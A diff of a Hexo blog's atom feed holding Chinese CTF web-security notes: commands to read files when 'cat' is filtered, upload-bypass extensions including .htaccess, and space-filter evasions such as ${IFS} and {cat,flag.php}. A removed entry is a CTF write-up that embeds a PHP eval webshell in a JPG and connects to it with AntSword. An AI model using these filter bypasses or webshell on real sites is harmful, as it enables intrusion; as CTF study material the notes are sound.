@@ -6,7 +6,7 @@
   <link href="http://cxdshibaba.github.io/atom.xml" rel="self"/>
   
   <link href="http://cxdshibaba.github.io/"/>
-  <updated>2022-07-08T08:00:11.269Z</updated>
+  <updated>2023-03-01T13:35:15.118Z</updated>
   <id>http://cxdshibaba.github.io/</id>
   
   <author>
@@ -17,18 +17,38 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>cat被过滤</title>
+    <link href="http://cxdshibaba.github.io/2023/03/01/cat%E8%A2%AB%E8%BF%87%E6%BB%A4/"/>
+    <id>http://cxdshibaba.github.io/2023/03/01/cat%E8%A2%AB%E8%BF%87%E6%BB%A4/</id>
+    <published>2023-03-01T13:34:33.000Z</published>
+    <updated>2023-03-01T13:35:15.118Z</updated>
+    
+    <content type="html"><![CDATA[<p>当cat被过滤后,可以使用一下命令进行读取文件的内容<br>(1)more:一页一页的显示的显示档案内容<br>(2)less:与more类似,但是比more更好的是,他可以[pg dn][pg up]翻页<br>(3)head:查看头几行<br>(4)tac:从最后一行开始显示,可以看出tac是cat的反向显示<br>(5)tail:查看尾几行<br>(6)nl:显示的时候,顺便输出行号<br>(7)od:以二进制的方式读取档案内容<br>(8)vi:一种编辑器，这个也可以查看<br>(9)vim:一种编辑器,这个也可以查看<br>(10)sort:可以查看<br>(11)uniq:可以查看<br>(12)file -f:报错出具体的内容</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;当cat被过滤后,可以使用一下命令进行读取文件的内容&lt;br&gt;(1)more:一页一页的显示的显示档案内容&lt;br&gt;(2)less:与more类似,但是比more更好的是,他可以[pg dn][pg up]翻页&lt;br&gt;(3)head:查看头几行&lt;br&gt;(4)tac:从最后一行开</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
     <title>文件上传绕过后缀的文件格式</title>
     <link href="http://cxdshibaba.github.io/2022/07/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%90%8E%E7%BC%80%E7%9A%84%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"/>
     <id>http://cxdshibaba.github.io/2022/07/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%90%8E%E7%BC%80%E7%9A%84%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/</id>
     <published>2022-07-08T07:59:20.000Z</published>
-    <updated>2022-07-08T08:00:11.269Z</updated>
+    <updated>2022-07-12T08:55:05.376Z</updated>
     
-    <content type="html"><![CDATA[<p>php,php3,php4,php5,phtml.pht</p>]]></content>
+    <content type="html"><![CDATA[<p>php,php3,php4,php5,phtml.pht，.htaccess</p>]]></content>
     
     
       
       
-    <summary type="html">&lt;p&gt;php,php3,php4,php5,phtml.pht&lt;/p&gt;
+    <summary type="html">&lt;p&gt;php,php3,php4,php5,phtml.pht，.htaccess&lt;/p&gt;
 </summary>
       
     
@@ -203,16 +223,16 @@
     <link href="http://cxdshibaba.github.io/2022/04/26/%E7%A9%BA%E6%A0%BC%E8%A2%AB%E8%BF%87%E6%BB%A4%E5%8F%AF%E9%87%87%E7%94%A8%E7%9A%84%E6%96%B9%E6%B3%95/"/>
     <id>http://cxdshibaba.github.io/2022/04/26/%E7%A9%BA%E6%A0%BC%E8%A2%AB%E8%BF%87%E6%BB%A4%E5%8F%AF%E9%87%87%E7%94%A8%E7%9A%84%E6%96%B9%E6%B3%95/</id>
     <published>2022-04-26T11:43:39.000Z</published>
-    <updated>2022-04-26T11:44:15.389Z</updated>
+    <updated>2022-07-23T06:06:40.753Z</updated>
     
-    <content type="html"><![CDATA[<p>过滤空格的解决办法如下</p><p>$IFS<br>${IFS}<br>$IFS$1 //$1改成$加其他数字貌似都行<br>&lt;<br>&lt;&gt;<br>{cat,flag.php}  //用逗号实现了空格功能<br>%20<br>%09 </p>]]></content>
+    <content type="html"><![CDATA[<p>过滤空格的解决办法如下</p><p>$IFS<br>${IFS}<br>$IFS$1 //$1改成$加其他数字貌似都行<br>&lt;<br>&lt;&gt;<br>{cat,flag.php}  //用逗号实现了空格功能<br>%20<br>%09 </p><h5 id=""><a href="#" class="headerlink" title="/**/"></a>/**/</h5>]]></content>
     
     
       
       
     <summary type="html">&lt;p&gt;过滤空格的解决办法如下&lt;/p&gt;
 &lt;p&gt;$IFS&lt;br&gt;${IFS}&lt;br&gt;$IFS$1 //$1改成$加其他数字貌似都行&lt;br&gt;&amp;lt;&lt;br&gt;&amp;lt;&amp;gt;&lt;br&gt;{cat,flag.php}  //用逗号实现了空格功能&lt;br&gt;%20&lt;br&gt;%09 &lt;/p&gt;
-</summary>
+&lt;h5 i</summary>
       
     
     
@@ -233,26 +253,6 @@
       
       
     <summary type="html">&lt;p&gt;&lt;img src=&quot;https://i.bmp.ovh/imgs/2022/04/25/e8aa51b78f436428.png&quot;&gt;&lt;br&gt;1是格式&lt;br&gt;2是可选参数，有read和write，字面意思就是读和写&lt;br&gt;3是过滤器。主要有四种：字符串过滤器，转换过滤器，压缩</summary>
-      
-    
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title>文件上传漏洞</title>
-    <link href="http://cxdshibaba.github.io/2022/04/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
-    <id>http://cxdshibaba.github.io/2022/04/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</id>
-    <published>2022-04-18T13:04:49.000Z</published>
-    <updated>2022-04-18T13:15:02.589Z</updated>
-    
-    <content type="html"><![CDATA[<p>攻防世界里的upload1题目，首先查看源代码，发现只能上传jpg格式的文件，尝试使用带有一句话木马的jpg图片。<br>如何准备一句话木马：<br>1、准备任意图片pho.jpg<br>2、准备木马文件hack.php<br><?php @eval($_POST['hack']);?><br>3、利用系统命令，将木马复制到图片文件中，产生图片木马hack.jpg<br>copy pho.jpg/b+hack.php/a hack.jpg<br>将此文件上传，在burpsuite抓包<br><img src="https://s3.bmp.ovh/imgs/2022/04/18/0c198b14cfe5ef3b.png"><br>然后修改文件后缀为php上传<br><img src="https://s3.bmp.ovh/imgs/2022/04/18/4b87c1d34fc509bd.png"><br>这里显示上传成功，接着用蚁剑连接<br><img src="https://s3.bmp.ovh/imgs/2022/04/18/e30b408e9ec8e432.png"><br>这里的地址要对应burpsuite上传的地址，最后成功拿到flag<br><img src="https://s3.bmp.ovh/imgs/2022/04/18/9172616e410dafce.png"></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;攻防世界里的upload1题目，首先查看源代码，发现只能上传jpg格式的文件，尝试使用带有一句话木马的jpg图片。&lt;br&gt;如何准备一句话木马：&lt;br&gt;1、准备任意图片pho.jpg&lt;br&gt;2、准备木马文件hack.php&lt;br&gt;&lt;?php @eval($_POST[&#39;hac</summary>
       
     
     
